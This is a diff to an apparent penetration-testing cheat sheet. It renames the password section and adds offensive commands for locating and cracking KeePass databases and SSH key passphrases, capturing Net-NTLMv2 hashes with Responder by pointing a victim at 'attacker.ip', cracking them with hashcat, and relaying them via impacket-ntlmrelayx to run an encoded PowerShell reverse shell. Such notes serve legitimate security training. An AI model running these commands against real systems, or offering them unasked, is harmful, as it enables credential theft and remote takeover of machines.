@@ -39,7 +39,7 @@
 * [PostgreSQL - 5432](#PostgreSQL---5432)
 * [WINRM - 5985 - 5986](#WINRM---5985---5986)
 * [Fuzzing](#Fuzzing)
-* [Password crack](#password-crack)
+* [Password Attack](#password-Attack)
   * [Hash identifier](#Hash-identifier)
   * [John the Ripper](#John-the-Ripper)
   * [Hashcat](#hashcat)
@@ -666,7 +666,7 @@ ffuf -u http://target.com/ -w ./fuzzDicts/subdomainDicts/main.txt -H "Host:FUZZ.
 
 
 
-# Password crack
+# Password Attack
 
 ## Hash identifier
 
@@ -682,15 +682,6 @@ hashid '$P$BINTaLa8QLMqeXbQtzT2Qfizm2P/nI0'
 ~~~ bash
 john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=Raw-MD5 --pot=john.output
 ~~~
-
-
-### cracking SSH private key
-
-~~~ bash
-ssh2john id_rsa > ssh.hash
-john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
-~~~
-
 
 ### cracking htpasswd using mask
 
@@ -736,6 +727,48 @@ hashcat -m 1400 -a 0 hash.txt rockyou.txt
 
 ~~~ bash
 cat ~/.local/share/hashcat/hashcat.potfile
+~~~
+
+## Password Manager
+
+~~~ powershell
+Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+~~~
+
+~~~ bash
+keepass2john Database.kdbx > keepass.hash
+~~~
+
+~~~ bash
+john --wordlist=/usr/share/wordlists/rockyou.txt keepass.hash
+~~~
+
+## SSH Private Key Passphrase
+
+~~~ bash
+ssh2john id_rsa > ssh.hash
+john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
+~~~
+
+## Cracking Net-NTLMv2
+
+~~~ bash
+sudo responder -I tun0
+~~~
+
+~~~ cmd
+dir \\attacker.ip\test
+~~~
+
+~~~ bash
+hashcat --help | grep -i "ntlm"
+hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
+~~~
+
+## Relaying Net-NTLMv2
+
+~~~ bash
+sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.122.212 -c "powershell -enc <encrpyted reverse shell scripts>"
 ~~~
 
 
